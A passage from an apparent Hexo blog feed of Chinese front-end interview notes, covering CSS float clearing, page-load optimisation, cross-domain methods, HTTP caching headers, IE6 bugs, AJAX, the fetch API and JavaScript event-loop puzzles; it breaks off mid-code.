href="#清除浮动的技巧" class="headerlink" title="清除浮动的技巧"></a>清除浮动的技巧</h3><ol><li>使用空标签清除浮动。</li></ol><p>这种方法是在所有浮动标签后面添加一个空标签 定义css clear:both. 弊端就是增加了无意义标签。</p><ol><li>使用overflow。</li></ol><p>给包含浮动元素的父标签添加css属性 overflow:auto; zoom:1; zoom:1用于兼容IE6。</p><ol><li>使用after伪对象清除浮动。</li></ol><p>该方法只适用于非IE浏览器。具体写法可参照以下示例。使用中需注意以下几点。一、该方法中必须为需要清除浮动元素的伪对象中设置 height:0，否则该元素会比实际高出若干像素；</p><ol><li>浮动外部元素</li></ol><h3 id="清除浮动的几种方式，各自的优缺点"><a href="#清除浮动的几种方式，各自的优缺点" class="headerlink" title="清除浮动的几种方式，各自的优缺点"></a>清除浮动的几种方式，各自的优缺点</h3><ol><li>使用空标签清除浮动 clear:both(理论上能清除任何标签，但是这样会增加无意义的标签)</li><li>使用overflow:auto(空标签元素清除浮动而不得不增加无意义代码的弊端,使用zoom:1用于兼容IE)</li><li>使用afert伪元素清除浮动(用于非IE浏览器)</li></ol><h3 id="减少页面加载时间的方法"><a href="#减少页面加载时间的方法" class="headerlink" title="减少页面加载时间的方法"></a>减少页面加载时间的方法</h3><ol><li>优化图片 </li><li>图像格式的选择（GIF：提供的颜色较少，可用在一些对颜色要求不高的地方） </li><li>优化CSS（压缩合并css，如 margin-top, margin-left…) </li><li>网址后加斜杠（如<a href="http://www.campr.com/目录，会判断这个目录是什么文件类型，或者是目录。）" target="_blank" rel="noopener">www.campr.com/目录，会判断这个目录是什么文件类型，或者是目录。）</a> </li><li>标明高度和宽度（如果浏览器没有找到这两个参数，它需要一边下载图片一边计算大小，如果图片很多，浏览器需要不断地调整页面。这不但影响速度，也影响浏览体验。<br>当浏览器知道了高度和宽度参数后，即使图片暂时无法显示，页面上也会腾出图片的空位，然后继续加载后面的内容。从而加载时间快了，浏览体验也更好了） </li><li>减少http请求（合并文件，合并图片）</li></ol><h3 id="你都使用哪些工具来测试代码的性能？"><a href="#你都使用哪些工具来测试代码的性能？" class="headerlink" title="你都使用哪些工具来测试代码的性能？"></a>你都使用哪些工具来测试代码的性能？</h3><ol><li>Profiler</li><li>JSPerf（<a href="http://jsperf.com/nexttick-vs-setzerotimeout-vs-settimeout）" target="_blank" rel="noopener">http://jsperf.com/nexttick-vs-setzerotimeout-vs-settimeout）</a></li><li>Dromaeo</li></ol><h3 id="new操作符具体干了什么呢"><a href="#new操作符具体干了什么呢" class="headerlink" title="new操作符具体干了什么呢?"></a>new操作符具体干了什么呢?</h3><p>参考答案</p><ol><li>创建一个空对象，并且 this 变量引用该对象，同时还继承了该函数的原型</li><li>属性和方法被加入到 this 引用的对象中</li><li>新创建的对象由 this 所引用，并且最后隐式的返回 this</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj  = &#123;&#125;;</span><br><span class="line">obj.__proto__ = Base.prototype;</span><br><span class="line">Base.call(obj);</span><br></pre></td></tr></table></figure><h3 id="js延迟加载的方式有哪些？"><a href="#js延迟加载的方式有哪些？" class="headerlink" title="js延迟加载的方式有哪些？"></a>js延迟加载的方式有哪些？</h3><ol><li>defer和async</li><li>动态创建DOM方式（创建script，插入到DOM中，加载完毕后callBack）</li><li>按需异步载入js</li></ol><h3 id="如何解决跨域问题"><a href="#如何解决跨域问题" class="headerlink" title="如何解决跨域问题?"></a>如何解决跨域问题?</h3><ol><li>jsonp（jsonp 的原理是动态插入 script 标签）</li><li>document.domain + iframe</li><li>window.name、window.postMessage</li><li>服务器上设置代理页面</li></ol><h3 id="哪些操作会造成内存泄漏？"><a href="#哪些操作会造成内存泄漏？" class="headerlink" title="哪些操作会造成内存泄漏？"></a>哪些操作会造成内存泄漏？</h3><p>内存泄漏指任何对象在您不再拥有或需要它之后仍然存在。</p><p>垃圾回收器定期扫描对象，并计算引用了每个对象的其他对象的数量。如果一个对象的引用数量为 0（没有其他对象引用过该对象），或对该对象的惟一引用是循环的，那么该对象的内存即可回收。</p><ol><li>setTimeout 的第一个参数使用字符串而非函数的话，会引发内存泄漏。</li><li>闭包</li><li>控制台日志</li><li>循环（在两个对象彼此引用且彼此保留时，就会产生一个循环）</li></ol><h3 id="哪些性能优化的方法？"><a href="#哪些性能优化的方法？" class="headerlink" title="哪些性能优化的方法？"></a>哪些性能优化的方法？</h3><ol><li>减少http请求次数：CSS Sprites, JS、CSS 源码压缩、图片大小控制合适；网页 Gzip，CDN 托管，data 缓存 ，图片服务器</li><li>前端模板 JS + 数据，减少由于HTML标签导致的带宽浪费，前端用变量保存 AJAX 请求结果，每次操作本地变量，不用请求，减少请求次数</li><li>用 innerHTML 代替 DOM 操作，减少 DOM 操作次数，优化 javascript 性能</li><li>当需要设置的样式很多时设置 className 而不是直接操作 style</li><li>少用全局变量、缓存DOM节点查找的结果。减少 IO 读取操作</li><li>避免使用 CSS Expression（css表达式)又称 Dynamic properties(动态属性)</li><li>图片预加载，将样式表放在顶部，将脚本放在底部，加上时间戳</li></ol><h3 id="ie-各版本和-chrome-可以并行下载多少个资源"><a href="#ie-各版本和-chrome-可以并行下载多少个资源" class="headerlink" title="ie 各版本和 chrome 可以并行下载多少个资源"></a>ie 各版本和 chrome 可以并行下载多少个资源</h3><ol><li>IE6 2 个并发</li><li>iE7 升级之后的 6 个并发，之后版本也是 6 个</li><li>Firefox，chrome 也是6个</li></ol><h3 id="哪些地方会出现css阻塞，哪些地方会出现js阻塞？"><a href="#哪些地方会出现css阻塞，哪些地方会出现js阻塞？" class="headerlink" title="哪些地方会出现css阻塞，哪些地方会出现js阻塞？"></a>哪些地方会出现css阻塞，哪些地方会出现js阻塞？</h3><p>js 的阻塞特性：所有浏览器在下载 JS 的时候，会阻止一切其他活动，直到 JS 下载、解析、执行完毕后才开始继续并行下载其他资源并呈现内容。为了提高用户体验，新一代浏览器都支持并行下载 JS，但是 JS 下载仍然会阻塞其它资源的下载（例如.图片，css文件等）。<br>由于浏览器为了防止出现 JS 修改 DOM 树，需要重新构建 DOM 树的情况，所以就会阻塞其他的下载和呈现。</p><p>嵌入 JS 会阻塞所有内容的呈现，而外部 JS 只会阻塞其后内容的显示，</p><p>2 种方式都会阻塞其后资源的下载。也就是说外部样式不会阻塞外部脚本的加载，但会阻塞外部脚本的执行。</p><p>CSS 怎么会阻塞加载了？CSS 本来是可以并行下载的，在什么情况下会出现阻塞加载了(在测试观察中，IE6 下 CSS 都是阻塞加载）</p><p>当 CSS 后面跟着嵌入的 JS 的时候，该 CSS 就会出现阻塞后面资源下载的情况。而当把嵌入 JS 放到 CSS 前面，就不会出现阻塞的情况了。</p><p>根本原因：因为浏览器会维持 html 中 css 和 js 的顺序，样式表必须在嵌入的 JS 执行前先加载、解析完。而嵌入的 JS 会阻塞后面的资源加载，所以就会出现上面 CSS 阻塞下载的情况。</p><h3 id="嵌入JS应该放在什么位置？"><a href="#嵌入JS应该放在什么位置？" class="headerlink" title="嵌入JS应该放在什么位置？"></a>嵌入JS应该放在什么位置？</h3><ol><li>放在底部，虽然放在底部照样会阻塞所有呈现，但不会阻塞资源下载。</li><li>如果嵌入JS放在head中，请把嵌入JS放在CSS头部。</li><li>使用 defer（只支持IE）</li><li>不要在嵌入的JS中调用运行时间较长的函数，如果一定要用，可以用 setTimeout 来调用</li></ol><h3 id="Javascript无阻塞加载具体方式："><a href="#Javascript无阻塞加载具体方式：" class="headerlink" title="Javascript无阻塞加载具体方式："></a>Javascript无阻塞加载具体方式：</h3><ol><li>将脚本放在底部。<code>&lt;link&gt;</code>还是放在head中，用以保证在js加载前，能加载出正常显示的页面。<code>&lt;script&gt;</code>标签放在<code>&lt;/body&gt;</code>前。</li><li>阻塞脚本：由于每个<code>&lt;script&gt;</code>标签下载时阻塞页面解析过程，所以限制页面的<code>&lt;script&gt;</code>总数也可以改善性能。适用于内联脚本和外部脚本。</li><li>非阻塞脚本：等页面完成加载后，再加载js代码。也就是，在 window.onload 事件发出后开始下载代码。</li><li>defer属性：支持IE4和fierfox3.5更高版本浏览器</li><li>动态脚本元素：文档对象模型（DOM）允许你使用js动态创建HTML的几乎全部文档内容</li></ol><h3 id="WEB应用从服务器主动推送Data到客户端有那些方式？"><a href="#WEB应用从服务器主动推送Data到客户端有那些方式？" class="headerlink" title="WEB应用从服务器主动推送Data到客户端有那些方式？"></a>WEB应用从服务器主动推送Data到客户端有那些方式？</h3><ol><li>html5 websocket</li><li>WebSocket 通过 Flash</li><li>XHR长时间连接</li><li>XHR Multipart Streaming</li><li>不可见的Iframe</li><li><code>&lt;script&gt;</code>标签的长时间连接(可跨域)</li></ol><h3 id="网站重构"><a href="#网站重构" class="headerlink" title="网站重构"></a>网站重构</h3><p>在不改变外部行为的前提下，简化结构、添加可读性，而在网站前端保持一致的行为。也就是说是在不改变 UI 的情况下，对网站进行优化，在扩展的同时保持一致的 UI。</p><p>对于传统的网站来说重构通常是：</p><ol><li>表格(table)布局改为 DIV + CSS</li><li>使网站前端兼容于现代浏览器(针对于不合规范的CSS、如对 IE6 有效的)</li><li>对于移动平台的优化</li><li>针对于 SEO 进行优化</li><li>深层次的网站重构应该考虑的方面</li><li>减少代码间的耦合</li><li>让代码保持弹性</li><li>严格按规范编写代码</li><li>设计可扩展的API</li><li>代替旧有的框架、语言(如VB)</li><li>增强用户体验</li><li>通常来说对于速度的优化也包含在重构中</li><li>压缩JS、CSS、image等前端资源(通常是由服务器来解决)</li><li>程序的性能优化(如数据读写)</li><li>采用CDN来加速资源加载</li><li>对于JS DOM的优化</li><li>HTTP服务器的文件缓存</li></ol><h3 id="HTTP协议中与缓存相关的HTTP-Header有哪些"><a href="#HTTP协议中与缓存相关的HTTP-Header有哪些" class="headerlink" title="HTTP协议中与缓存相关的HTTP Header有哪些"></a>HTTP协议中与缓存相关的HTTP Header有哪些</h3><p>Cache-Control 、 Last-Modified、 Expires、Etag、 max-age</p><h3 id="网页的缓存"><a href="#网页的缓存" class="headerlink" title="网页的缓存"></a>网页的缓存</h3><p>是由HTTP消息头中的“Cache-control”来控制的，常见的取值有private、no-cache、max-age、must-revalidate等，默认为private。</p><p>Expires 头部字段提供一个日期和时间，响应在该日期和时间后被认为失效。允许客户端在这个时间之前不去检查（发请求），等同max-age的效果。但是如果同时存在，则被Cache-Control的max-age覆盖。</p><p><code>Expires = &quot;Expires&quot; &quot;:&quot; HTTP-date</code><br>例如：<br><code>Expires: Thu, 01 Dec 1994 16:00:00 GMT （必须是GMT格式）</code><br>如果把它设置为-1，则表示立即过期</p><p><code>Expires</code> 和 <code>max-age</code> 都可以用来指定文档的过期时间，但是二者有一些细微差别</p><ol><li>Expires在HTTP/1.0中已经定义，Cache-Control:max-age在HTTP/1.1中才有定义，为了向下<code>兼容</code>，仅使用max-age不够</li><li>Expires指定一个绝对的过期时间(GMT格式),这么做会导致至少2个问题：<ol><li>客户端和服务器时间不同步导致Expires的配置出现问题。 </li><li>很容易在配置后忘记具体的过期时间，导致过期来临出现浪涌现象</li></ol></li><li>max-age 指定的是从文档被访问后的存活时间，这个时间是个<code>相对值</code>(比如:3600s)，相对的是文档第一次被请求时服务器记录的Request_time(请求时间)</li><li>Expires 指定的时间可以是相对文件的最后访问时间(Atime)或者修改时间(MTime)，而max-age相对对的是文档的请求时间(Atime)</li><li>如果值为 no-cache,那么每次都会访问服务器。如果值为max-age，则在过期之前不会重复访问服务器。</li></ol><h3 id="浏览器缓存机制"><a href="#浏览器缓存机制" class="headerlink" title="浏览器缓存机制"></a>浏览器缓存机制</h3><p><a href="https://www.cnblogs.com/shixiaomiao1122/p/7591556.html" target="_blank" rel="noopener">https://www.cnblogs.com/shixiaomiao1122/p/7591556.html</a><br><a href="https://www.cnblogs.com/slly/p/6732749.html" target="_blank" rel="noopener">https://www.cnblogs.com/slly/p/6732749.html</a></p><p>判断缓存是否过期步骤是：</p><ul><li><p>不发生请求 强缓存：<br>  <strong>s-maxage优先于max-age优先于expires</strong></p><p>  1） 查看是否有cache-control 的max-age / s-maxage , 如果有，则用服务器时间date值 + max-age/s-maxage 的秒数计算出新的过期时间，将当前时间与过期时间进行比较，判断是否过期</p><p>  2）查看是否有cache-control 的max-age / s-maxage，如果没有，则用expires 作为过期时间比较</p></li><li><p>发送请求</p><p>  3）Last-Modified与ETag，<strong>ETag优先于Last-Modified</strong></p><pre><code>Last-Modified已经足以让浏览器知道本地的缓存副本是否足够新，为什么还需要Etag（实体标识）呢？HTTP1.1中Etag的出现主要是为了解决几个Last-Modified比较难解决的问题：1. Last-Modified标注的最后修改只能精确到秒级，如果某些文件在1秒钟以内，被修改多次的话，它将不能准确标注文件的新鲜度2. 如果某些文件会被定期生成，当有时内容并没有任何变化，但Last-Modified却改变了，导致文件没法使用缓存3. 有可能存在服务器没有准确获取文件修改时间，或者与代理服务器时间不一致等情形</code></pre></li></ul><img src="/study/Comprehensive/interview/cache.png" title="浏览器缓存机制"><img src="/study/Comprehensive/interview/cache-control.png"><img src="/study/Comprehensive/interview/user_cache.png" title="用户行为影响浏览器缓存"><p>浏览器的缓存来源是怎么设置的？</p><p>看到知乎有人讨论 <a href="https://www.zhihu.com/question/64201378" target="_blank" rel="noopener">https://www.zhihu.com/question/64201378</a></p><h3 id="写出几种IE6-BUG的解决方法"><a href="#写出几种IE6-BUG的解决方法" class="headerlink" title="写出几种IE6 BUG的解决方法"></a>写出几种IE6 BUG的解决方法</h3><ol><li>双边距BUG float引起的 使用display</li><li>像素问题 使用float引起的 使用dislpay:inline -3px</li><li>超链接hover 点击后失效 使用正确的书写顺序 link visited hover active</li><li>Ie z-index问题 给父级添加position:relative</li><li>Png 透明 使用js代码 改</li><li>Min-height 最小高度 !Important 解决’</li><li>select 在ie6下遮盖 使用iframe嵌套</li><li>为什么没有办法定义1px左右的宽度容器(IE6默认的行高造成的，使用over:hidden,zoom:0.08 line-height:1px)</li><li>ie 6 不支持!important</li></ol><h3 id="AJAX生命周期"><a href="#AJAX生命周期" class="headerlink" title="AJAX生命周期"></a>AJAX生命周期</h3><p>一个AJAX请求从开始创建到最后的响应阶段，在其整个生命周期中，使用了哪些Javascript对象与方法?<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ajaxStart()</span><br><span class="line">ajaxSend()</span><br><span class="line">ajaxSuccess()</span><br><span class="line">ajaxStop()</span><br><span class="line">load()</span><br></pre></td></tr></table></figure></p><p>在一个Ajax请求的生命周期中，从创建请求到提交请求到成功响应的五种状态：</p><ol><li><code>UNINITIALIZED</code>—请求尚未初始化。</li><li><code>LOADING</code>—请求已经初始化完成。</li><li><code>LOADED</code>—请求已经发送，正在等待确认。</li><li><code>INTERACTIVE</code>—正在从服务器下载响应数据。</li><li><code>COMPLETE</code>—请求/响应周期结束。</li></ol><h3 id="一个POST请求的Content-type有多少种，传输的数据格式有何区别"><a href="#一个POST请求的Content-type有多少种，传输的数据格式有何区别" class="headerlink" title="一个POST请求的Content-type有多少种，传输的数据格式有何区别"></a>一个POST请求的Content-type有多少种，传输的数据格式有何区别</h3><ol><li><code>application/x-www-form-urlencoded</code> 浏览器的原生 form 表单，如果不设置 enctype 属性，那么最终就会以 application/x-www-form-urlencoded 方式提交数据</li><li><code>multipart/form-data</code>这种方式一般用来上传文件。我们使用表单上传文件时，必须让form 的 enctyped 等于这个值</li><li><code>application/json</code>告诉服务端消息主体是序列化后的 JSON 字符串</li><li><code>text/xml</code></li></ol><h3 id="什么是RESETful-API-如何设计一个open-API接口"><a href="#什么是RESETful-API-如何设计一个open-API接口" class="headerlink" title="什么是RESETful API,如何设计一个open API接口"></a>什么是RESETful API,如何设计一个open API接口</h3><p>REST 指的是一组架构约束条件和原则。满足这些约束条件和原则的应用程序或设计就是 RESTful。</p><h3 id="YSlow-34条性能优化建议哪些与HTTP协议相关"><a href="#YSlow-34条性能优化建议哪些与HTTP协议相关" class="headerlink" title="YSlow 34条性能优化建议哪些与HTTP协议相关"></a>YSlow 34条性能优化建议哪些与HTTP协议相关</h3><p>静态资源缓存优化的最佳状态是：直接从本地缓存中读取 &gt; 304 状态 &gt; 200 状态。关于 HTTP 状态码，与网站性能优化有关的主要是以下几个。</p><ol><li><p>尽量减少 200 状态码的请求。200 表示是一个正常的请求返回，此条优化规则要求尽可能多的减少页面的 HTTP Request 数量。常见的方法有：合并打包静态资源、使用 <code>CSS Sprite</code> 雪碧图合并、缓存 <code>AJAX</code>、使用 <code>LocalStorage/UserData/Manifest</code> 等本地缓存技术。</p></li><li><p>清理返回 301/302 状态码的入口链接。301 表示永久重定向，302 表示临时重定向。服务器端使用重定向返回通常是为了兼容一个旧的入口链接。我们能做的优化是，将调用旧入口的场景进行清理，直接调用重定向之后的新 URL 地址。</p></li><li><p>304 表示静态资源未更新，浏览器可直接使用本地缓存文件。通常 304 的产生与浏览器的处理机制以及服务器缓存头配置有一定的关系。304 虽然未传输文件主体内容，但 HTTP 请求的建立依然是一个可以避免的性能损耗。腾讯 KM（内部知识分享平台）上有一篇文章通过在真实海量业务场景（没记错的话是 Qzone 业务）中，正交验证 HTTP 1.0 与 1.1 协议中与缓存相关的 HTTP Header 配置，结合日志分析得出了一个最佳实践：关闭 Etag 配置，只启用 Cache-Control 与 Last-Modified 响应头。为了兼容老浏览器，可保留 Expires。<br>因为 Etag 的缓存方案，在经过 CDN 及网关代理服务器后，会导致缓存命中率下降。从以上「浏览器缓存检查机制流程」图上可以看出，使用强缓存（Cache-Control max-age 设置为一年）后浏览器在资源过期前不会发起 HTTP 请求，那如何保证静态资源在服务器上更新后本地的缓存也能同步更新呢？可参考百度 FIS 的「文件指纹」方案。</p></li><li><p>清理返回 404 状态码的入口链接。静态资源文件的 404 调用需严格避免，而入口页面的 404 则在所难免。通过在全站 404 页面进行产品引导与体验优化，并结合数据上报记录来源页（HTTP Referer Header 或 document.referrer），可以找到并清理 404 来源入口。对于由搜索引擎进入的来源，可通过主动提交新索引至搜索引擎，或使用 301/302 重定向的方式，有效利用起这些「被浪费的流量」。</p></li><li><p>502 服务器出错。如果是 Nginx + FastCGI 的常见架构，通常是由于 Nginx 缓冲区溢出或服务器资源被耗尽引起，针对不同的业务场景进行 Nginx 的配置优化能显著提升服务器抗压性能。</p></li></ol><h3 id="html元素优先级"><a href="#html元素优先级" class="headerlink" title="html元素优先级"></a>html元素优先级</h3><p>在html中，帧元素（frameset）的优先级最高，表单元素比非表单元素的优先级要高。<br>所有的html元素又可以根据其显示分成两类：有窗口元素以及无窗口元素。有窗口元素总是显示在无窗口元素的前面。</p><p>有窗口元素包括：select元素，object元素，以及frames元素等等。</p><p>无窗口元素：大部分html元素都是无窗口元素。</p><h3 id="HTML-CSRF可以发起GET请求的标签"><a href="#HTML-CSRF可以发起GET请求的标签" class="headerlink" title="HTML CSRF可以发起GET请求的标签"></a>HTML CSRF可以发起GET请求的标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;link href=&apos;&apos;&gt;</span><br><span class="line">&lt;img src=&apos;&apos;&gt;</span><br><span class="line">&lt;frame src=&apos;&apos;&gt;</span><br><span class="line">&lt;script src=&apos;&apos;&gt;</span><br><span class="line">&lt;video src=&apos;&apos;&gt;</span><br><span class="line">Background:url(&apos;&apos;)</span><br></pre></td></tr></table></figure><h2 id="节点之间的空白符"><a href="#节点之间的空白符" class="headerlink" title="节点之间的空白符"></a>节点之间的空白符</h2><p> 在firefox、chrome、opera、safari浏览器是文本节点,IE不是.所以IE是3，其它浏览器是7<br> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">li</span>&gt;</span>javascript<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">li</span>&gt;</span>jQuery<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">li</span>&gt;</span>PHP<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p> 如果把代码改成这样:<br><code>&lt;ul&gt;&lt;li&gt;javascript&lt;/li&gt;&lt;li&gt;jQuery&lt;/li&gt;&lt;li&gt;PHP&lt;/li&gt;&lt;/ul&gt;</code></p><p>运行结果:3（IE和其它浏览器结果是一样的）</p><h2 id="removeChild"><a href="#removeChild" class="headerlink" title="removeChild"></a>removeChild</h2><p> X=node.removeChild(child)把删除的子节点赋值给 x，这个子节点不在DOM树中，但是还存在内存中，<br>如果要完全删除对象，给 x 赋 null 值</p><h2 id="fetch跟jquery-ajax的区别"><a href="#fetch跟jquery-ajax的区别" class="headerlink" title="fetch跟jquery ajax的区别"></a>fetch跟jquery ajax的区别</h2><p>这也是fetch很奇怪的地方：</p><p>当接收到一个代表错误的 HTTP 状态码时，从 fetch()返回的 Promise 不会被标记为 reject，而是标记为 resolve（但是会将 resolve 的返回值的 ok 属性设置为 false ）即使该 HTTP 响应的状态码是 404 或 500。</p><p>仅当网络故障时或请求被阻止时，才会标记为 reject。</p><p>默认情况下, fetch 不会从服务端发送或接收任何 cookies, 如果站点依赖于用户 session，则会导致未经认证的请求（要发送 cookies，必须设置 credentials 选项）.</p><p>fetch是比较底层的API，很多情况下都需要我们再次封装。<br>比如：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// jquery ajax</span></span><br><span class="line">$.post(url, &#123;<span class="attr">name</span>: <span class="string">'test'</span>&#125;)</span><br><span class="line"><span class="comment">// fetch</span></span><br><span class="line">fetch(url, &#123;</span><br><span class="line">    method: <span class="string">'POST'</span>,</span><br><span class="line">    body: <span class="built_in">Object</span>.keys(&#123;<span class="attr">name</span>: <span class="string">'test'</span>&#125;).map(<span class="function">(<span class="params">key</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">encodeURIComponent</span>(key) + <span class="string">'='</span> + <span class="built_in">encodeURIComponent</span>(params[key]);</span><br><span class="line">    &#125;).join(<span class="string">'&amp;'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>由于fetch是比较底层的API，所以需要我们手动将参数拼接成’name=test’的格式，而jquery ajax已经封装好了。所以fetch并不是开箱即用的。<br>另外，fetch还<code>不支持超时控制</code>。</p><blockquote><p>axios体积比较小，也没有上面fetch的各种问题，我认为是当前最好的请求方式 </p></blockquote><h2 id="只有设置了相对定位，或者绝对定位的元素才具有的属性是（z-index）"><a href="#只有设置了相对定位，或者绝对定位的元素才具有的属性是（z-index）" class="headerlink" title="只有设置了相对定位，或者绝对定位的元素才具有的属性是（z-index）"></a>只有设置了相对定位，或者绝对定位的元素才具有的属性是（z-index）</h2><p><a href="https://juejin.im/post/5adf0085518825673123da9a" target="_blank" rel="noopener">当面试官问你Vue响应式原理，你可以这么回答他</a></p><p><a href="https://juejin.im/post/5ad10800f265da23826e681e" target="_blank" rel="noopener">如何解释vue的生命周期才能令面试官满意？</a></p><p><a href="https://www.tuicool.com/articles/v2aeMbn?utm_medium=hao.caibaojian.com&amp;utm_source=hao.caibaojian.com" target="_blank" rel="noopener">HTML5中37个最重要的技术点</a></p><p><a href="https://www.tuicool.com/articles/bInqieZ?utm_medium=hao.caibaojian.com&amp;utm_source=hao.caibaojian.com" target="_blank" rel="noopener">BAT 要的是什么样的前端实习生？</a></p><p><a href="http://www.codeceo.com/chrome-broswer-layout.html" target="_blank" rel="noopener">从 Chrome 源码看浏览器如何 layout 布局</a></p><p><a href="https://segmentfault.com/a/1190000013894510" target="_blank" rel="noopener">从八道面试题看JavaScript DOM事件机制</a></p><p><a href="https://segmentfault.com/a/1190000013963213" target="_blank" rel="noopener">【前端性能优化】高性能JavaScript整理总结</a></p><p><a href="https://www.tuicool.com/articles/n22MNrA?utm_medium=hao.caibaojian.com&amp;utm_source=hao.caibaojian.com" target="_blank" rel="noopener">三分钟快速理解javascript内存管理</a><br><a href="https://segmentfault.com/a/1190000013972464" target="_blank" rel="noopener">ES6小技巧</a><br><a href="https://www.tuicool.com/articles/zANVnqM" target="_blank" rel="noopener">优雅的 JavaScript 排序算法（ES6）</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;vue数据双向绑定的原理&quot;&gt;&lt;a href=&quot;#vue数据双向绑定的原理&quot; class=&quot;headerlink&quot; title=&quot;vue数据双向绑定的原理&quot;&gt;&lt;/a&gt;vue数据双向绑定的原理&lt;/h3&gt;&lt;p&gt;主要讲了实现是基于Object.defineProperty
      
    
    </summary>
    
      <category term="学习" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="专题笔记" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/%E4%B8%93%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="面试" scheme="http://lry1994.github.io/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>js题摘录</title>
    <link href="http://lry1994.github.io/study/Comprehensive/js-problem.html"/>
    <id>http://lry1994.github.io/study/Comprehensive/js-problem.html</id>
    <published>2018-05-04T16:00:00.000Z</published>
    <updated>2018-10-08T01:17:36.100Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/ceshi986745/article/details/51698893" target="_blank" rel="noopener">44个Javascript变态题解析</a></p><h2 id="foreach"><a href="#foreach" class="headerlink" title="foreach"></a>foreach</h2><p>数组的foreach可以和闭包起一样的作用</p><p>闭包中的变量包括参数，在内部函数执行完毕之前不会被释放</p><h2 id="JS运行机制"><a href="#JS运行机制" class="headerlink" title="JS运行机制"></a>JS运行机制</h2><p>执行栈,任务队列</p><p><code>process.nextTick</code>方法可以在当前”执行栈”的尾部—-下一次Event Loop（主线程读取”任务队列”）之前—-触发回调函数</p><p><code>setImmediate</code>方法则是在当前”任务队列”的尾部添加事件</p><p><code>process.nextTick</code>指定的回调函数是在本次”事件循环”触发，而setImmediate指定的是在下次”事件循环”触发</p><p><code>setTimeout(fn,0)</code>表示当前代码执行完（执行栈清空）以后，立即执行（0毫秒间隔）指定的回调函数。</p><p><code>Promise</code>，里面的函数是直接执行的.</p><p><code>Promise</code> 的 then 应当会放到当前 “执行栈”的尾部</p><img src="/study/Comprehensive/js-problem/js_zhan_duilie.jpg" title="js堆栈"><p>在Javascript引擎里面，队列还分为 Task队列（也有人叫做 MacroTask）和 MicroTask队列， MicroTask会优先于 Task执行。</p><p>比如常见的点击事件、 setImmediate、 setTimeout、 MessageChannel等会放入 Task队列，</p><p>但是 Promise以及 MutationObserver会放到 Microtask队列。</p><p>同时，Javascript引擎在执行 Microtask队列的时候，如果期间又加入了新的 Microtask，则该 Microtask会加入到之前的 Microtask队列的尾部，保证 Microtask先于 Task队列执行。</p><p>Task(MacroTask)队列中： <strong>setImmediate &gt; MessageChannel &gt; setTimeout 0</strong></p><p><a href="https://mp.weixin.qq.com/s/2ilx-5kDvszjF66iAvYQlg?utm_medium=hao.caibaojian.com&amp;utm_source=hao.caibaojian.com" target="_blank" rel="noopener">你真的了解Javascript执行顺序么？</a></p><ul><li>1<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">let</span> b = a.map(<span class="function"><span class="params">n</span>=&gt;</span>&#123;n=n+<span class="number">1</span>&#125;);</span><br><span class="line"><span class="keyword">let</span> c = a.map(<span class="function"><span class="params">n</span>=&gt;</span>n=n+<span class="number">1</span>);</span><br><span class="line">b<span class="comment">// [undefined, undefined, undefined]</span></span><br><span class="line">c<span class="comment">// [2, 3, 4]</span></span><br></pre></td></tr></table></figure></li></ul><p>改成<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> b = a.map(<span class="function"><span class="params">n</span> =&gt;</span> &#123;n = n + <span class="number">1</span>;<span class="keyword">return</span> n;&#125;);</span><br></pre></td></tr></table></figure></p><p>原因<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(a,b,c) =&gt; 表达式（单一）相当于</span><br><span class="line">(a,b,c)=&gt;&#123; <span class="keyword">return</span> 表达式&#125;</span><br></pre></td></tr></table></figure></p><ul><li>2<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">111111111111111110000</span>;</span><br><span class="line">b=<span class="number">111</span>;</span><br><span class="line"><span class="built_in">console</span>.info(a+b);<span 